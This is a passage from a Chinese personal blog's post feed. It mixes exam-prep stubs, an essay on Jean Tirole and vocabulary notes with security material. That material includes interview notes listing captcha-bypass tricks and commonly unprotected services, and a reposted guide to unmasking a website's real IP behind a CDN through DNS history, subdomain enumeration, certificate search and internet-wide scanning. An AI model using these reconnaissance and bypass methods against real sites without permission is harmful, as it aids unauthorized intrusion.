<p><strong>11 json格式的数据包可以测哪些漏洞</strong></p>
<p>敏感信息泄漏</p>
<p>注入</p>
<p>XSS</p>
<p>CSRF</p>
<p>xxe</p>
<p><strong>12 如果网站评论区的复选框存在xss,</strong></p>
<p><strong>怎么修复</strong></p>
<p>xss修复从3个角度</p>
<p>1）httponly cookie</p>
<p>2）输入检查 参数的位置 限制住输入的点</p>
<p>3）输出编码 实体化</p>
<p><strong>13 绕过验证码有哪些思路</strong></p>
<p>1）爆破</p>
<p>2）前端校验</p>
<p>3）生成的验证码会在请求包，前端生成性, 写出对应算法即可</p>
<p>4）万能验证码 000000 888888 8888888</p>
<p>5）删除验证码字段</p>
<p>6）不刷新</p>
<p>7）验证码可识别</p>
<p><strong>14 除了各种服务的未授权，</strong></p>
<p><strong>网站的未授权怎么测</strong></p>
<p>目前主要服务存在未授权访问漏洞的有：</p>
<p>NFS服务、Samba服务、LDAP、Rsync、FTP、GitLab、Jenkins、MongoDB、Redis、ZooKeeper、ElasticSearch、Memcached、CouchDB、Docker、Solr、Hadoop、Dubbo、JBOSS 、VNC</p>
<p>网站的未授权</p>
<p>1）字典枚举</p>
<p>2）JS/HTML接口提取</p>
<p>JSFinder  <a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>面试</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>王道-杂论篇</title>
    <url>/2021/08/05/%E7%8E%8B%E9%81%93-%E6%9D%82%E8%AE%BA%E7%AF%87/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/DS/image-20210805141953547.png" alt="image-20210805141953547"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>思维导图</category>
        <category>408</category>
        <category>408</category>
        <category>DS</category>
        <category>DS</category>
        <category>习题篇</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>王道天勤-串</title>
    <url>/2021/08/08/%E7%8E%8B%E9%81%93%E5%A4%A9%E5%8B%A4-%E4%B8%B2/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/DS/image-20210808173413653.png" alt="image-20210808173413653"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>思维导图</category>
        <category>408</category>
        <category>408</category>
        <category>DS</category>
        <category>DS</category>
        <category>习题篇</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>王道天勤-查找</title>
    <url>/2021/08/16/%E7%8E%8B%E9%81%93%E5%A4%A9%E5%8B%A4-%E6%9F%A5%E6%89%BE/</url>
    <content><![CDATA[<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
  </entry>
  <entry>
    <title>王道天勤-栈与队列</title>
    <url>/2021/08/05/%E7%8E%8B%E9%81%93%E5%A4%A9%E5%8B%A4-%E6%A0%88%E4%B8%8E%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/DS/image-20210805172014107.png" alt="image-20210805172014107"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>思维导图</category>
        <category>408</category>
        <category>408</category>
        <category>DS</category>
        <category>DS</category>
        <category>习题篇</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>王道天勤-线性表</title>
    <url>/2021/08/05/%E7%8E%8B%E9%81%93%E5%A4%A9%E5%8B%A4-%E7%BA%BF%E6%80%A7%E8%A1%A8/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/DS/image-20210805151612370.png" alt="image-20210805151612370"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>思维导图</category>
        <category>408</category>
        <category>408</category>
        <category>DS</category>
        <category>DS</category>
        <category>习题篇</category>
      </categories>
      <tags>
        <tag>考研</tag>
      </tags>
  </entry>
  <entry>
    <title>真题总结-数学一</title>
    <url>/2021/10/06/%E7%9C%9F%E9%A2%98%E6%80%BB%E7%BB%93-%E6%95%B0%E5%AD%A6%E4%B8%80/</url>
    <content><![CDATA[<p><img src="https://ckcah.github.io/images/z/image-20211006151303742.png" alt="image-20211006151303742"></p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>考研</category>
        <category>真题总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>经济学里的“梯若尔现象”</title>
    <url>/2021/08/16/%E7%BB%8F%E6%B5%8E%E5%AD%A6%E9%87%8C%E7%9A%84%E2%80%9C%E6%A2%AF%E8%8B%A5%E5%B0%94%E7%8E%B0%E8%B1%A1%E2%80%9D/</url>
    <content><![CDATA[<p><em><strong>keyword：本文原载于《经济学家茶座》2016年第2期（总第72辑）。</strong></em></p>
<p>让·梯若尔（Jean Tirole）教授生于1953年，1978年获得应用数学博士学位，1981年获得经济学博士学位。他一直担任名满欧洲、享誉世界的法国图卢兹大学产业经济研究所（IDEI）的科研所长（Scientific Director），同时在多家大学担任兼职教授。根据百度百科的介绍，他是2014年诺贝尔经济学奖获得者，在全世界所有经济学家中排名第二。</p>
<p>我们可以从IDEI网页上下载到梯若尔教授的学术简历。他的英文简历是2015年9月更新的，从这份简历里我们可以看到，他共发表了180多篇英语论文（包括期刊论文和书的章节）和40多篇法语论文，出版了10余部专著，可以说是极其高产，用一个成语来形容就是“著作等身”。</p>
<p>在这里，笔者想要探讨的是梯若尔教授为什么能够取得如此巨大的学术成功，其学术成功背后的原因究竟有哪些。网上有一句广为流传的励志名言讲得非常好，“成功的人是跟别人学习经验，失败的人只跟自己学习经验。”毫无疑问，梯若尔教授的经验是值得广大经济学研习者学习的。</p>
<p>从梯若尔教授1981年开始发表第一篇论文算起，不看法语论文，单看英语论文，他平均每年大概发表5篇高质量的英语论文。从他1985年开始出版第一部著作算起，他平均大概每年写130页。这些耀眼的数字还不是最关键的，最关键的是他的论著质量奇高。</p>
<p>用北京大学国家发展研究院教授汪浩的话来说就是，“有人可能觉得这些数字看起来并非高不可攀，但是考虑到论文和专著的质量，其代表的成就的确令人叹为观止。”根据某知名学术搜索的统计，我们可以发现，他撰写的《产业组织理论》（The Theory of Industrial Organization）一书被引用14000多次，《公司金融理论》（The Theory of Corporate Finance）一书被引用1900多次。他与让-雅克·拉丰（Jean-Jacques Laffont）合著的《政府采购与规制中的激励理论》（A Theory of Incentives in Procurement and Regulation）一书被引用5300多次，合著的《电信竞争》（Competition in telecommunications）一书被引用1400多次。</p>
<p>他发表的论文中被引用2000次以上的有4篇，被引用1000次以上2000次以下的有10余篇，其他被引用几百次的论文还有一大批，我们就不在这里一一列举。</p>
<p>梯若尔教授是起先读的是应用数学博士，后面读的是经济学博士，他的受教育背景跟绝大多数的经济学者不一样。从本质上看，梯若尔教授本身就代表了一种新的经济学培养模式，这种培养模式跟传统的培养模式有很大的不同。</p>
<p>传统的培养模式是按部就班地从经济学学士到经济学硕士再到经济学博士，也就是所谓的经济学科班出身。当然，我们在这里不是要否定和批评传统的经济学培养模式，传统的经济学培养模式也出了很多“快手”，比如其中最为著名的麻省理工学院（MIT）的达龙·阿塞莫格鲁（Daron Acemoglu）教授。</p>
<p>笔者在《经济学家茶座》2008年第6辑（总第38辑）曾经发表过一篇题目为《经济学里的“阿塞莫格鲁现象”》的文章，其中写到，“阿塞莫格鲁博士是有很强的代表性的，他并没有像梯若尔（Tirole）和拉丰（Lafont）那样取得数学博士学位之后又取得经济学博士学位，即使是‘骑着数学的快马在经济学的沙场上征跑’也并不是因为自己具有数学上的先天优势。”</p>
<p>没想到仅在该文发表六年之后，梯若尔教授就斩获了诺贝尔经济学奖，如果拉丰教授还健在的话，估计很有可能会跟梯若尔教授一起分享该年度的诺贝尔经济学奖。笔者对“阿塞莫格鲁现象”进行解读时，指出了阿塞莫格鲁博士学术成功背后的四点原因：</p>
<p>第一，经济学的基本功要特别扎实；第二，能够转换研究领域，并且能够在自己的研究领域里进行深度挖掘；第三，善于寻找和自己知识互补的学者进行合作研究；第四，具有健康的体魄和充沛的体力。作为《经济学里的“阿塞莫格鲁现象”》的姊妹篇，本文在解读“梯若尔现象”时，当然不能“穿新鞋走老路”，而是要从梯若尔教授自身的现实条件出发，看看他是如何在他自身的约束下实现学术最大化的。下面就让笔者分四点进行阐述。</p>
<p>事先声明一下，这四点只是笔者基于梯若尔教授目前已经取得的学术成就的解读，不同的学者可能会有不同的解读，所谓“仁者见仁，智者见智”。如果你认同笔者的解读，可以从中借鉴一些对自己有益的东西；如果你不认同笔者的解读，你自己也可以提出一些替代性的解读。</p>
<p>第一点就是，要善于运用自己的比较优势。学术市场就像产品市场，论文和著作就是产品，作者就是生产者，生产者只有遵循比较优势才能在市场中立足。经济学者在进行研究时，要清楚自己的比较优势之所在，不能拿自己的短项跟别人的长项比拼，否则很可能事倍功半、出力不讨好。</p>
<p>对经济学研究者而言，不管是谁，要想取得学术上的成功，都需要把自己的比较优势发挥到极致。梯若尔教授的比较优势就是他的深厚数学功力以及基于数学功力的对经济学思想理解上的超强穿透力。梯若尔教授在写作的过程中充分利用了自身的比较优势。</p>
<p>打个比方，如果你拥有传说中的倚天剑或屠龙刀，你不能把倚天剑或屠龙刀“束之高阁”，你要想方设法让倚天剑或屠龙刀成为自己的有效武器，最好是常备武器而不是秘密武器。梯若尔教授就像中国人所熟知的白眉大侠徐良一样，也做到了刀、剑、招和人合而为一。</p>
<p>他的180多篇英语论文和10余部著作，基本上都是带有数学模型的理论分析，这一点跟许多功成名就的经济学家在后期喜欢写纯文字性的经济学论文有很大的区别。数学模型就是梯若尔教授的刀和剑，把数学模型和经济学思想结合起来就是梯若尔教授的招。正是凭借着他的刀、剑和招，梯若尔教授才成为经济学里的“学术英雄”。</p>
<p>第二点就是，要善于用“新瓶装旧酒”。在汉语中，“新瓶装旧酒”用来比喻用新的形式表现旧的内容。有很多人先是读了数学的博士，然后再转读经济学的博士，为什么偏偏梯若尔教授能成为这些人中的佼佼者呢？要知道，数学很好的人在进行经济学研究时容易剑走偏锋，陷入非主流。</p>
<p>梯若尔教授在写论文的过程中，不是先从边缘非主流领域做起，而是先从传统主流领域做起，在传统主流领域的基础上向外扩张，绝大多数时候他手里拿着的刀和剑始终就是他所擅长的博弈论和合约理论。大家可以看看他写的论文的主题，基本上围绕企业、政府、银行和市场展开，当然论文要在这些大的话题（topic）下面找一个小的问题（question），而对小点的捕捉则依赖于其基于数学功力的对经济学思想的超强领悟力。</p>
<p>当然，老酒也有可能会发生新变化，比如，有一部分会变成有香味的乙酸乙酯。老的主题里面也可能会有新的现象发生，梯若尔教授也非常善于捕捉这些老主题中的新现象，他的一些论文的研究对象实际上是针对新现象的。“新瓶装旧酒”中的“旧酒”正是这些传统主流领域以及这些传统主流领域所发生的现象。</p>
<p>说得夸张一点，这些传统的主流领域就像爱情、婚姻和家庭一样是人类永恒的主题，在这些永恒的主题上搞出的突破很有可能是重大突破，至少是容易被大家认可的突破。这种“新瓶装旧酒”可以保证梯若尔教授始终行走在主流经济学的大道上。由于梯若尔教授具有我们在第一点中所讲的数学工具上的比较优势，所以他在这些传统主流领域形成了“摧枯拉朽之势”。</p>
<p>第三点就是，要善于选择有效的合作方式。梯若尔教授发表的180多篇英语论文中，大概有30篇是独立完成的，其他都是跟合作者一起共同完成的，合作的成果大概占到85%，可以说绝大多数论文都是合作的。</p>
<p>这一方面说明，当今的经济学学术研究已经慢慢从单打独斗的时代转变到合作共赢的时代，就是像梯若尔教授这样的学术大牛也概莫能外。另一方面也说明，梯若尔教授确实在合作方面做得比较好，领会和践行了合作之道。</p>
<p>合作里面大有学问，这一点尤其值得国内经济学者借鉴。阿塞莫格鲁教授比较善于跟自己知识互补的学者进行合作，梯若尔教授则比较善于跟自己有共同知识结构的学者进行合作。跟自己知识互补的学者进行合作，有利于现有任务的安排和当前研究的完成。跟自己知识结构相同的学者进行合作更容易碰撞出思想的火花，有利于新思想的产生，为写下一篇论文做好铺垫。两种方式各有自己的长处。</p>
<p>第一种方式可以实现远距离、跨区域合作，交流不需要那么频繁，只需要把任务布置下来就可以了。第二种方式需要比较多的接触和交流，合作过程中新思想源源不断的产生可能会导致合作伙伴比较稳定、合作时间比较长久。</p>
<p>梯若尔教授和合作伙伴大都比较稳定和长久，譬如，他和他的导师埃里克·马斯金（Eric Maskin）合作发表了一大批论文，他和朱·弗登博格（Drew Fudenberg）合作发表了一大批论文，他和让-雅克·拉丰合作发表了一大批论文，他和马赛厄斯·德瓦特里庞合作发表了一大批论文，他和本特·霍姆斯特姆（Bengt Holmström）合作发表了一大批论文，他和菲利普·阿吉翁（Philippe Aghion）也合作发表了一些论文。</p>
<p>这些合作者都是诺贝尔经济学奖级别的，有的已经获得了诺贝尔经济学奖，有的将来很有可能获得诺贝尔经济学奖，有的有实力获得诺贝尔经济学奖但却不幸英年早逝。梯若尔教授对合作方式的选择，很值得那些数学功力比较强的经济学者借鉴。</p>
<p>第四点就是，要有比较强的执行力。微观经济学里有一句非常著名的话是，“选择是已经显示的偏好。”对这句话稍做改编，用在梯若尔教授身上就是，“结果是已经显示的行动。”梯若尔教授的学术发表记录那么优秀，说明他平时就很刻苦，他平时的执行力就很强。</p>
<p>人都是有惰性的，都喜欢拖延。诺贝尔经济学奖获得者乔治·阿克洛夫（George Akerlof）教授曾经在《美国经济评论》1991年第81卷第2期上发表过一篇题目为《拖延与服从》（Procrastination and Obedience）的论文，在这篇论文中他基于亲身经历建立一个模型，阐明了拖延的内在机制和危害。很多人把拖延（Procrastination）翻译成拖延症，对付这个症的良药就是提高执行力。</p>
<p>在写作论文的过程中，要根据时间情况安排自己的进程，争取做到“今日事，今日毕”，不要因为偷懒而把事情拖延到明天。我国古代有一首非常著名的《明日歌》，里面有几句是这么写的，“明日复明日，明日何其多。我生待明日，万事成蹉跎。”笔者认为，梯若尔教授的速度是跟他的执行力强分不开的。</p>
<p>要知道，论文发表是“一连串的事情”，从构思到建模到写成初稿到不断修改到投稿，中间任何一个环节拖延，都会导致论文发表的拖延。提高执行力，应该成为每个经济学研究者的习惯，好习惯才能带来学术成功，好习惯才能成就美好学术人生。</p>
<p>“梯若尔现象”并不像“阿塞莫格鲁现象”那样具有普遍的借鉴意义，因为很多研究者都是通过传统模式或者接近于传统模式培养出来的，如果硬要照搬梯若尔教授的研究模式，很容易“邯郸学步”。笔者觉得，其中第四点相对而言具有更加普遍的借鉴意义，第一点、第二点和第三点要从精神实质上进行借鉴。</p>
<p>最后，笔者来说一下梯若尔教授对经济学特别是组织经济学的影响。我们在用博弈论或者合约理论来分析组织问题时，很多时候都是在无形之中借鉴了梯若尔教授的方法，可能无形到我们根本就不会在参考文献中列出梯若尔的文献，因为这些东西早已内化到我们的内心深处了，我们甚至忘记了这实际上是梯若尔意义上的（in the sense of Tirole）。</p>
<p>这种影响就如同莱昂内尔·罗宾斯（Lionel Robbins）教授所著的《经济科学的性质和意义》对我们的经济学方法带来的影响一样，我们已经分不清是罗宾斯的还是我们自己的。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>扩展读物</category>
      </categories>
      <tags>
        <tag>日常阅读</tag>
      </tags>
  </entry>
  <entry>
    <title>绕过CDN寻找真实IP的8种方法</title>
    <url>/2020/05/26/%E7%BB%95%E8%BF%87CDN%E5%AF%BB%E6%89%BE%E7%9C%9F%E5%AE%9EIP%E7%9A%848%E7%A7%8D%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p><strong>keyword：我只是互联网的搬运工</strong></p>
<p><strong>转载：<a href="https://mp.weixin.qq.com/s/JkqLu0SBcOGIq7JdLzj8Uw">https://mp.weixin.qq.com/s/JkqLu0SBcOGIq7JdLzj8Uw</a></strong></p>
<p>正常情况下，通过cmd命令可以快速找到域名对应IP，最常见的命令如ping、nslookup。但很多站点出于用户体验和安全的角度，使用CDN加速，将域名解析到CDN，这时候就需要绕过CDN来查找真实IP。</p>
<p><strong>一、DNS历史解析记录</strong></p>
<p>查询域名的历史解析记录，可能会找到网站使用CDN前的解析记录，从而获取真实ip，相关查询的网站有：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iphistory：https://viewdns.info/iphistory/</span><br><span class="line">DNS查询：（https://dnsdb.io/zh-cn/）</span><br><span class="line">微步在线：（https://x.threatbook.cn/）</span><br><span class="line">域名查询：（https://site.ip138.com/）</span><br><span class="line">DNS历史查询：（https://securitytrails.com/）</span><br><span class="line">Netcraft：https://sitereport.netcraft.com/?url=github.com</span><br></pre></td></tr></table></figure>

<p>IP History 查询记录：</p>
<img src="https://ckcah.github.io/images/CDN/1.png">

<p><strong>二、查找子域名</strong></p>
<p>很多时候，一些重要的站点会做CDN，而一些子域名站点并没有加入CDN，而且跟主站在同一个C段内，这时候，就可以通过查找子域名来查找网站的真实IP。</p>
<p>常用的子域名查找方法和工具：</p>
<p>1、搜索引擎查询：如Google、baidu、Bing等传统搜索引擎，site:baidu.com inurl:baidu.com，搜target.com|公司名字。</p>
<span id="more"></span> 

<p>2、一些在线查询工具，如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://tool.chinaz.com/subdomain/</span><br><span class="line">http://i.links.cn/subdomain/    </span><br><span class="line">http://subdomain.chaxun.la/</span><br><span class="line">http://searchdns.netcraft.com/</span><br><span class="line">https://www.virustotal.com/</span><br></pre></td></tr></table></figure>

<p>3、 子域名爆破工具</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain：https://github.com/ring04h/wydomain    </span><br><span class="line">subDomainsBrute:https://github.com/lijiejie/</span><br><span class="line">Sublist3r:https://github.com/aboul3la/Sublist3r</span><br></pre></td></tr></table></figure>

<p><strong>三、网站邮件头信息</strong></p>
<p>比如说，邮箱注册，邮箱找回密码、RSS邮件订阅等功能场景，通过网站给自己发送邮件，从而让目标主动暴露他们的真实的IP，查看邮件头信息，获取到网站的真实IP。</p>
<img src="https://ckcah.github.io/images/CDN/2.png">

<p><strong>四、网络空间安全引擎搜索</strong></p>
<p>通过关键字或网站域名，就可以找出被收录的IP，很多时候获取到的就是网站的真实IP。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">钟馗之眼：https://www.zoomeye.org</span><br><span class="line">Shodan：https://www.shodan.io</span><br><span class="line">Fofa：https://fofa.so</span><br></pre></td></tr></table></figure>

<p>ZoomEy搜索：</p>
<img src="https://ckcah.github.io/images/CDN/3.png">

<p><strong>五、利用SSL证书寻找真实IP</strong></p>
<p>证书颁发机构(CA)必须将他们发布的每个SSL/TLS证书发布到公共日志中，SSL/TLS证书通常包含域名、子域名和电子邮件地址。因此SSL/TLS证书成为了攻击者的切入点。</p>
<p>SSL证书搜索引擎：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://censys.io/ipv4?q=github.com</span><br></pre></td></tr></table></figure>

<p>Censys 证书搜索：</p>
<img src="https://ckcah.github.io/images/CDN/4.png">

<p><strong>六、国外主机解析域名</strong></p>
<p>大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。</p>
<p>国外多PING测试工具：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://asm.ca.com/zh_cn/ping.php</span><br><span class="line">http://host-tracker.com/</span><br><span class="line">http://www.webpagetest.org/</span><br><span class="line">https://dnscheck.pingdom.com/</span><br></pre></td></tr></table></figure>

<p>国外多ping网站测试：</p>
<img src="https://ckcah.github.io/images/CDN/5.png">

<p><strong>七、扫描全网</strong></p>
<p>通过Zmap、masscan等工具对整个互联网发起扫描，针对扫描结果进行关键字查找，获取网站真实IP。</p>
<p>1、ZMap号称是最快的互联网扫描工具，能够在45分钟扫遍全网。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/zmap/zmap</span><br></pre></td></tr></table></figure>

<p>2、Masscan号称是最快的互联网端口扫描器，最快可以在六分钟内扫遍互联网。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/robertdavidgraham/masscan</span><br></pre></td></tr></table></figure>

<p><strong>八、配置不当导致绕过</strong></p>
<p>在配置CDN的时候，需要指定域名、端口等信息，有时候小小的配置细节就容易导致CDN防护被绕过。</p>
<p>案例1：为了方便用户访问，我们常常将<code>www.test.com</code> 和 <code>test.com</code> 解析到同一个站点，而CDN只配置了<a href="http://www.test.com,通过访问test.com,就可以绕过/">www.test.com，通过访问test.com，就可以绕过</a> CDN 了。</p>
<p>案例2：站点同时支持http和https访问，CDN只配置 https协议，那么这时访问http就可以轻易绕过。</p>
<script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      <categories>
        <category>网络安全</category>
        <category>奇淫技巧</category>
        <category>信息搜集</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>姿势学习</tag>
      </tags>
  </entry>
  <entry>
    <title>词汇的魅力</title>
    <url>/2021/08/06/%E8%AF%8D%E6%B1%87%E7%9A%84%E9%AD%85%E5%8A%9B/</url>
    <content><![CDATA[<h1 id="词根类"><a href="#词根类" class="headerlink" title="词根类"></a>词根类</h1><h2 id="inter"><a href="#inter" class="headerlink" title="inter"></a>inter</h2><p>between</p>
<h2 id="pel"><a href="#pel" class="headerlink" title="*pel-"></a>*pel-</h2><p>stick</p>
<h2 id="plek"><a href="#plek" class="headerlink" title="*plek-"></a>*plek-</h2><p>to fold</p>
<p><em><strong>eg: complicate</strong></em></p>
<h2 id="pele"><a href="#pele" class="headerlink" title="*pele-"></a>*pele-</h2><p>to fill</p>
<h2 id="sekw"><a href="#sekw" class="headerlink" title="*sekw-"></a>*sekw-</h2><p>to follow</p>
<h2 id="wal"><a href="#wal" class="headerlink" title="*wal-"></a>*wal-</h2><p>“to be strong”</p>
<h2 id="weid"><a href="#weid" class="headerlink" title="*weid-"></a>*weid-</h2><p>“to see”</p>
<h1 id="词组类"><a href="#词组类" class="headerlink" title="词组类"></a>词组类</h1><h2 id="assume-认为、假定、假设"><a href="#assume-认为、假定、假设" class="headerlink" title="assume: 认为、假定、假设"></a><strong>assume: 认为、假定、假设</strong></h2><p>（这个单词来源于05年考研真题text1）</p>
<p>英语解释：<em>Assume</em> isn’t only used to mean “accept as truth without checking”; it also means “take on the form of.” It might be safer if you don’t <em>assume</em> that the vampire standing in front of you isn’t merely a person <em>assuming</em> that form.</p>
<p>意思大概就是，不止是可以表示 “在不经查证的情况下接受这个真理”，还可以指“采取的某种形式”</p>
<p>考研真题文章中原译为：假设其他动物不能很好的感受到委屈、不满等情绪，结合上下文就可以看出，其实<strong>这个观点是不成立的</strong>。</p>
<p>比如这句话就很好的解释了它的本意：</p>
<p><em>I</em> <strong>assume</strong> <em>his train was late</em></p>
<p>我猜他火车晚点了</p>
<p>presume：有依据的假设</p>
<h2 id="tell-说、辨别、显示、识别"><a href="#tell-说、辨别、显示、识别" class="headerlink" title="tell    说、辨别、显示、识别"></a>tell    说、辨别、显示、识别</h2><p>关于辨别的：</p>
<p>英文解释：And there’s also a way to use <em>tell</em> to mean “determine with certainty,” like when you can tell it’s going to rain because the sky is so dark.</p>
<p>tell也可以意味知道</p>
<p>当你知道要下雨时，是因为天空太黑了。</p>
<h2 id="alongside-旁边"><a href="#alongside-旁边" class="headerlink" title="alongside 旁边"></a>alongside 旁边</h2><p>​        If you pull up alongside your friend’s car in a parking lot, it means that you’ve parked directly beside it. <em><strong>Alongside can also imply cooperation</strong></em>, as when a baker’s assistant works alongside him, kneading dough and wiping flour off the counter. <em>Alongside</em> was once a phrase, either “along side” or “along the side,” both primarily used in a nautical sense, to talk about boats. </p>
<p>​        The shelves of alternative book shops carried a new section , somewhere alongside Ecology and Esotericism , called Earth Mysteries .</p>
<h2 id="expend-使用、花费、支付"><a href="#expend-使用、花费、支付" class="headerlink" title="expend 使用、花费、支付"></a>expend 使用、花费、支付</h2><p>The verb <em>expend</em> means to use. If you <em>expend</em> all your energy raking the leaves, you may be too tired to play hockey afterwards. Better pace yourself — you’ll never get all of the leaves on the ground, after all.</p>
<p><em><strong>自我理解：调整节奏，一个合适的度</strong></em></p>
<h2 id="little-和few"><a href="#little-和few" class="headerlink" title="little 和few"></a>little 和few</h2><p>little一般表示几乎没有，不是很多，微不足道</p>
<p>few表示一点，很少，不是具体的数</p>
<h2 id="present-礼物、现在、介绍"><a href="#present-礼物、现在、介绍" class="headerlink" title="present 礼物、现在、介绍"></a>present 礼物、现在、介绍</h2><p>The word <em>present</em> has multiple meanings, most of which concern giving (a <em>present</em> is a gift) or time (the <em>present</em> is right now).</p>
<p>The verb <em>present</em> might mean to deliver something like a speech, or perform something like a play. On formal occasions, when we present someone, we introduce them, usually to a group or to the public. <em>Present</em> might also mean “to submit” or “hand over.” In grammar, the present tense expresses actions or states occurring at the time we’re speaking of them, that is to say, at this moment.</p>
<h2 id="irritating-annoying-讨厌的、令人烦恼的"><a href="#irritating-annoying-讨厌的、令人烦恼的" class="headerlink" title="irritating/annoying 讨厌的、令人烦恼的"></a>irritating/annoying 讨厌的、令人烦恼的</h2><p>annoying 通常是指自我的感受</p>
<p>irritating通常某件事情刺激到了什么（大概是很突兀的感觉）</p>
<h2 id="shows-and-suggests"><a href="#shows-and-suggests" class="headerlink" title="shows and suggests"></a>shows and suggests</h2><p>what a literary work shows and suggests</p>
<p>这里的 shows  and suggests表示展示和暗示</p>
<h2 id="address-地址、演说"><a href="#address-地址、演说" class="headerlink" title="address 地址、演说"></a>address 地址、演说</h2><p>解决？</p>
